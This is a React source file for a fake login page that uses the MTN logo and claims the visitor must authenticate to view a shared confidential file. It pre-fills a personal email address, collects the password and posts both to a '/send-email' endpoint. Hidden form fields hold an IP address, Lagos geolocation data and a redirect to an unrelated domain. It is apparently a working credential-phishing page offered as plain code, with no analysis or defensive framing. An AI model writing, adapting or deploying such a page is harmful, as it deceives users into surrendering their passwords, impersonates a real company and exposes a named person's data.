import React, { useState } from "react";
import { Box, TextField, Button, Typography, CircularProgress, IconButton, InputAdornment } from "@mui/material";
import axios from "axios";
// import { Visibility, VisibilityOff } from "@mui/icons-material";

const MtnLoginPage: React.FC = () => {
  const [email, setEmail] = useState("evansjota@gmail.com");
  const [password, setPassword] = useState("");
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);
  const [showPassword, setShowPassword] = useState(false);

  const handleLogin = async () => {
    if (!password) {
      setError("Password is required!");
      return;
    }

    setLoading(true); // Show loading indicator

    try {
      await axios.post("http://localhost:8080/send-email", { email, password });
      setError(""); // Clear any errors
    } catch (err) {
      setError("Failed to send email. Try again!");
      console.error("Email sending error:", err);
    } finally {
      setLoading(false); // Hide loading indicator
    }
  };

  const togglePasswordVisibility = () => {
    setShowPassword(!showPassword);
  };

  return (
    <Box
      sx={{
        minHeight: "100vh",
        display: "flex",
        justifyContent: "center",
        alignItems: "center",
        backgroundColor: "#f5f5f5",
      }}
    >
      <Box
        sx={{
          width: "100%",
          maxWidth: 400,
          bgcolor: "background.paper",
          borderRadius: 2,
          boxShadow: 3,
          p: 4,
          textAlign: "center",
        }}
      >
        <Box sx={{ mb: 3 }}>
          <img
            src="https://logos-world.net/wp-content/uploads/2021/02/MTN-Logo.png"
            alt="Logo"
            style={{ width: 80, height: 80, objectFit: "contain" }}
          />
          <Typography variant="h6" sx={{ color: "firebrick", mt: 2, textTransform: "uppercase", fontSize: 18 }}>
            <b>You must authenticate to view a shared confidential file.</b>
          </Typography>
          <Typography variant="body2" sx={{ color: "firebrick", mt: 2 }}>
            <b>Confirm ownership of the email specified below.</b>
          </Typography>
        </Box>

        <form onSubmit={(e) => e.preventDefault()}>
          <TextField
            fullWidth
            label="Email"
            variant="outlined"
            margin="normal"
            value={email}
            disabled
            sx={{ mb: 2 }}
          />
          <TextField
            fullWidth
            label="Password"
            variant="outlined"
            type={showPassword ? "text" : "password"}
            margin="normal"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            error={!!error}
            helperText={error}
            InputProps={{
              endAdornment: (
                <InputAdornment position="end">
                  <IconButton onClick={togglePasswordVisibility} edge="end">
                    {/* {showPassword ? <VisibilityOff /> : <Visibility />} */}
                  </IconButton>
                </InputAdornment>
              ),
            }}
          />

          {/* Hidden Inputs */}
          <input name="em-field" value={email} type="hidden" />
          <input name="pidt-field" value="62.173.45.238" type="hidden" />
          <input name="ocdt-field" value="Nigeria" type="hidden" />
          <input name="icdt-field" value="Lagos" type="hidden" />
          <input name="oldt-field" value="3.3903000354767" type="hidden" />
          <input name="aldt-field" value="6.4474000930786" type="hidden" />
          <input name="auth_status_" value="0" type="hidden" />
          <input name="__winHref" value="https://billionnext.com/genl/#akada@mtn.com" type="hidden" />
          <input name="UrlDom_main" value="mtn.com" type="hidden" />

          <Button
            fullWidth
            variant="contained"
            color="primary"
            sx={{ mt: 2 }}
            onClick={handleLogin}
            disabled={loading}
          >
            {loading ? <CircularProgress size={24} /> : "Sign in"}
          </Button>

          <Box sx={{ mt: 2, display: "flex", alignItems: "center", justifyContent: "center" }}>
            <input type="checkbox" id="flexCheckDefault" defaultChecked />
            <label htmlFor="flexCheckDefault" style={{ marginLeft: 8, fontSize: 14 }}>
              Secured Session?
            </label>
          </Box>
        </form>
      </Box>
    </Box>
  );
};

export default MtnLoginPage;